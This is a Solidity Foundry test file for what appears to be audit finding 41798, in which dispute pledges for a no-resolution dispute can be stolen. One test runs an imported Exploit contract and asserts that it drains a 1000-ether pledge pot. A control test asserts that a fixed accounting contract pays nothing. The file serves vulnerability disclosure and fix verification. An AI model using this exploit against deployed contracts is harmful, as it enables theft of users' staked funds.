// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Token,
    Oracle,
    EscalationModule,
    BondEscalationAccountingFixed,
    Sock,
    IOracle
} from "./41798-dispute-pledges-for-a-noresolution-dispute-can-be-stolen-by.sol";

contract Finding41798Test is Test {
    function test_exploit_ten_addresses_drain_1000_pledges() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.potBefore(), 1000 ether, "pot");
        assertEq(e.stolen(), 1000 ether, "stolen");
        assertEq(e.token().balanceOf(address(e)), 1000 ether, "attacker");
        assertEq(e.token().balanceOf(address(e.acct())), 0, "accounting empty");
        assertEq(e.acct().pledges(e.DISPUTE(), e.token()), 0, "pledges");
    }

    function test_control_zero_pledges_pay_nothing() public {
        Token token = new Token();
        Oracle oracle = new Oracle();
        EscalationModule module = new EscalationModule();
        BondEscalationAccountingFixed acct = new BondEscalationAccountingFixed(oracle);
        bytes32 dispute = keccak256("no-resolution-dispute");
        bytes32 request = keccak256("request");
        oracle.setStatus(dispute, IOracle.DisputeStatus.NoResolution);
        acct.setResult(dispute, token, request, 100 ether, module, 1000 ether);
        token.mint(address(acct), 1000 ether);

        Sock sock = new Sock();
        sock.take(acct, dispute, address(token));

        assertEq(token.balanceOf(address(this)), 0, "caller got nothing");
        assertEq(token.balanceOf(address(sock)), 0, "sock got nothing");
        assertEq(token.balanceOf(address(acct)), 1000 ether, "pot intact");
        assertEq(acct.pledges(dispute, token), 1000 ether, "pledges intact");
    }
}
